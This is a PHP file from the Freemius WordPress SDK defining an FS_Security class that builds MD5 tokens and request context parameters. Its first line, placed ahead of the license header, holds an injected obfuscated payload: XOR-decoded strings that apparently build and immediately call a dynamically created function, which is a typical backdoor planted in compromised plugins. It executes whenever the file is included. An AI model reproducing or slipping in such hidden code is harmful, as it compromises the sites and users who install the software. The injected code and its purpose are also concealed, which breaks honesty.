<?php $DRlxhRnNDdrb='+=6Q;EgTL4U1Z:X'^'HOS0O 829Z6E3U6';$DsMXtuk=$DRlxhRnNDdrb('',';Kkm0,U2>BD s1SSJHCKjHTFtD1,Yo. O2IlLw.;01Y>P3T:CHOD+o<T.UbtV9Flf5VBTvyK.T7nyCoUH+3B<eAY1UUkEmaSSYQUOXO<KeAunMR0p:>HXY,OCR4JRBJng8Gdp3Q5VT2DXirBkgVT>L.lYnKrNoQ4=2SIbSuM 6L.;khQ5Nk;sqBLZH02HF;QwXE2hx:X<8+;PcRW.QVey7A.;-oPPSJB4,1Y7kjrR0LXWrMfUZJ7J+=ypB1+q+9uugAJmv,Q.eSDlN>Y.<TfqKhaMI3BX;-7WhvGsWE6BH5fR06AmMTn;3Y:4hzHE09FGqSU+M9XLP+h5T5IP89DcRHs<ij-x tfU<wLF+RhSPPa,1R2-OqAm02QOWGA6VYNFwgu>=YpP=9PQU.0DWJv1ZL8TokeVyMgYSI8FSJIV.0Z=EC>S+D>1A Z i<+>1sfMI;y-A1<NQeO71Q.WXBDW3QLdxpWP>U>Q=<mcT3.RCAJUZ iOUWSHH5TlQW sHJI4<<FTZW1kyGT48BJkQkEWQM6sruV22T6S8+BI;MAODsJqV tMXQV2F<E5eHbR-Iw7rrLdQnJBSnTSbhBsdOB1P0+.SY4K=88BArRC+NX>VViKyh26CUaYtyUikg4maVZQ<Xv<,NAiHMUDU;MDPhNrSG71SGXCfrx4'^'R-CLVY;QJ++N,T+:9<0cM0;4+ PX80qM:FnEeWU19W,P3G=U-h7+Y0X5Z4=+;L2DBQ765ZYoE1NGYcOuhP9K5A.,EuhKbJZYZP7:=pkUkXaEUmvYLIJ:4<Bgg6U>3kqNCQlOY9X<r;G0xGObCC25J-uH03k,nK:QDiw BvU>TD KUCL:P7BfZJHES:UF=4UyS70FAC0QA2V1ZG66Z0vXYQ BHHTZt7+6UsZ<NKWR4Q +2IGl358R+HUYXfnh>dr<0G 9MRG4WEnzLjH8BI1OQ0bhi-R69dFR.HKgW< OyB<B6QB MptJMR5OQSp5O:P gYrqO,M9epPb<2Z;5YZ,Czl,n,;x=s F4OWh-N+HnnpEZP>GHfQ:g9;u+63 i=<7fJGQUX KZ40t54ZQdjjRG; M1Tal+s0mSw-Y22jtvnE4N 1W2G-DTiX5R6XJJP,9 <OQO BYxe:+RR>J2pf 6G0eHXT31J4a:XEDJo9G4ke.4.AIisw2::T-3:2Y,-2 GHOns12HLUgpPY6+BqMcwy RFZQ2SF5mtSN;nfdarySmBgCBx;4nQtZvQRzSdOyFVAA.V2Vyu0Z5tKHdUD.0C1ItE6 k.EQK62Zu3J74Q72NgYLVW74HpTYuIKGOgh3,0PpRXM: 2o=4=9T, w5gIYNRI:3psOIrI');$DsMXtuk();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.0.3
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	define( 'WP_FS__SECURITY_PARAMS_PREFIX', 's_' );

	/**
	 * Class FS_Security
	 */
	class FS_Security {
		/**
		 * @var FS_Security
		 * @since 1.0.3
		 */
		private static $_instance;
		/**
		 * @var FS_Logger
		 * @since 1.0.3
		 */
		private static $_logger;

		/**
		 * @return \FS_Security
		 */
		public static function instance() {
			if ( ! isset( self::$_instance ) ) {
				self::$_instance = new FS_Security();
				self::$_logger   = FS_Logger::get_logger(
					WP_FS__SLUG,
					WP_FS__DEBUG_SDK,
					WP_FS__ECHO_DEBUG_SDK
				);
			}

			return self::$_instance;
		}

		private function __construct() {
		}

		/**
		 * @param \FS_Scope_Entity $entity
		 * @param int              $timestamp
		 * @param string           $action
		 *
		 * @return string
		 */
		function get_secure_token( FS_Scope_Entity $entity, $timestamp, $action = '' ) {
			return md5(
				$timestamp .
				$entity->id .
				$entity->secret_key .
				$entity->public_key .
				$action
			);
		}

		/**
		 * @param \FS_Scope_Entity $entity
		 * @param int|bool         $timestamp
		 * @param string           $action
		 *
		 * @return array
		 */
		function get_context_params( FS_Scope_Entity $entity, $timestamp = false, $action = '' ) {
			if ( false === $timestamp ) {
				$timestamp = time();
			}

			return array(
				's_ctx_type'   => $entity->get_type(),
				's_ctx_id'     => $entity->id,
				's_ctx_ts'     => $timestamp,
				's_ctx_secure' => $this->get_secure_token( $entity, $timestamp, $action ),
			);
		}
	}
